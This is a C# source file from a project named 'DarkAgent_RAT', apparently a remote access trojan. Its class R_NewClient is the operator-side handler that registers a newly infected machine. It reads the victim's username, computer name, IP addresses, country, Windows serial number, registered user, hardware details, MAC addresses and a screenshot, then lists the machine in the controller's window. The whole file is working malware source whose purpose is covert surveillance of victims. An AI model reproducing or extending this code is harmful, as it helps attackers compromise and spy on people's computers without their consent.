using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.Net;
using DarkAgent_RAT.src.Utils;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Receive
{
    class R_NewClient : ReceiveBasePacket
    {
        public R_NewClient(RatClients client, byte[] packet)
            : base(client, packet)
        {
        }

        private IPAddress LanIP;
        private string ClientName;
        private string Country;
        private string Username;
        private string ComputerName;

        private string Windows;
        private int BuildNumber;
        private string OsBits;
        private string RegisteredUser;
        private string WindowsSerial;
        private string SystemDirectory;
        private string SystemDrive;
        private string RAM;
        private string CPU;
        private string MacAddresses;
        private string RatVersion;
        private string ServicePack;
        private byte[] ClientScreen;

        public override void Read()
        {
            ClientName = ReadString();
            Country = ReadString();
            LanIP = new IPAddress(ReadBytes(4));
            Username = ReadString();
            ComputerName = ReadString();

            Windows = ReadString();
            BuildNumber = ReadInteger();
            OsBits = ReadString();
            ServicePack = ReadString();
            RegisteredUser = ReadString();
            WindowsSerial = ReadString();
            SystemDirectory = ReadString();
            SystemDrive = ReadString();
            RAM = ReadString();
            CPU = ReadString();
            MacAddresses = ReadString();
            RatVersion = ReadString();
            short ClientScreenSize = ReadShort();
            ClientScreen = ReadBytes(ClientScreenSize);
            Client.ScreenSize = new Point(ReadShort(), ReadShort());
        }

        public override void Run()
        {
            MemoryStream stream = new MemoryStream(ClientScreen);
            Image image = Image.FromStream(stream);
            settings.MainForm.ClientScreens.Images.Add(image);
            string[] str = new string[19];
            str[0] = Client.ClientID.ToString();
            str[1] = ClientName;
            str[2] = Country;
            str[3] = Client.RemoteEndPoint.ToString();
            str[4] = LanIP.ToString();
            str[5] = ComputerName;
            str[6] = Username;
            str[7] = Windows;
            str[8] = BuildNumber.ToString();
            str[9] = OsBits;
            str[10] = ServicePack;
            str[11] = RegisteredUser;
            str[12] = WindowsSerial;
            str[13] = SystemDirectory;
            str[14] = SystemDrive;
            str[15] = RAM;
            str[16] = CPU;
            str[17] = MacAddresses;
            str[18] = RatVersion;

            ListViewItem itm = new ListViewItem(str, settings.MainForm.listView3.Items.Count);
            settings.MainForm.listView3.Items.Add(itm);

            //cleaning memory after we used it
            LanIP = null;
            ClientName = null;
            Country = null;
            Username = null;
            ComputerName = null;
            Windows = null;
            OsBits = null;
            RegisteredUser = null;
            WindowsSerial = null;
            SystemDirectory = null;
            SystemDrive = null;
            RAM = null;
            CPU = null;
            MacAddresses = null;
            RatVersion = null;
            ServicePack = null;
        }
    }
}
